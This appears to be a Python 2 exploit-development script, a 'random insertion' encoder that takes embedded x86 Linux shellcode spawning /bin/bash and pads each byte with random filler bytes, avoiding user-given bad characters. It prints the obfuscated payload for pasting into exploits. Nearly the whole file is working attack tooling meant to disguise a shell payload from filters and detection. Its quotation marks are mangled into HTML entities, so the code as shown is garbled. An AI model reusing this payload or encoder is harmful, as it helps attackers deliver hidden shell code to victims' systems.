# Python Random Insertion Encoder
# Author: Aditya Chaudhary
# Date: 5th Feb 2019


import random
import sys
import argparse

shellcode = ("\x31\xc0\x50\x89\xe2\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--entropy", help="Entropy of random byted to be inserted after each shellcode byte (use a value between 1 & 10)", type=int)
parser.add_argument("-b", "--badchars", help="Badchars to removed from inserted bytes", type=str)
args = parser.parse_args()


encoded = ""
encoded2 = ""


entropy = args.entropy
bad_chars = args.badchars
#print len(sys.argv)
#if len(sys.argv) > 1:
#	entropy = int(sys.argv[1])

print &#039;[#] Using Entropy: %s (inserting 1 to %s random number of bytes)&#039;%(entropy, entropy)

#if len(sys.argv) < 3:
#	print &#039;[#] No Bad characters provided&#039;
#else:
#	bad_chars = str(sys.argv[2])
bad_chars = bad_chars.split(&#039;,&#039;)
print &#039;[#] Bad chars: %s&#039;%(bad_chars)

# Generate byte string from \x01 to \xff
chars = []
for o in range(256):
    #print(hex(o))
	ch = &#039;%02x&#039; % o
	if ch  not in bad_chars:
		chars.append(ch)


print &#039;[#] Generating Shellcode...&#039;

repeat = 0

for x in bytearray(shellcode) :
	repeat = random.randint(1, entropy)
	#print "[#]"+str(repeat)
	encoded += &#039;\\x&#039;
	encoded += &#039;%02x&#039; % x
	encoded += &#039;\\x&#039;
	encoded += &#039;%02x&#039;% repeat

	encoded2 += &#039;0x&#039;
	encoded2 += &#039;%02x,&#039; % x
	encoded2 += &#039;0x&#039;
	encoded2 += &#039;%02x,&#039; % repeat

	en_byte = ""
	for i in range(1, repeat+1):
		# print i
		en_byte = chars[random.randint(0, len(chars)-1)]

		encoded += &#039;\\x%s&#039; % en_byte
		# encoded += &#039;\\x%02x&#039; % random.randint(1,255)
		encoded2 += &#039;0x%s,&#039; % en_byte
		# encoded2 += &#039;0x%02x,&#039; % random.randint(1,255)
	#encoded += &#039;\n&#039;


print &#039;[#] Encoded shellcode:&#039;

print encoded
print encoded2

print &#039;[#] Shellcode Length: %d&#039; % len(bytearray(shellcode))
print &#039;[#] Encoded Shellcode Length: %d&#039; % encoded.count(&#039;x&#039;)

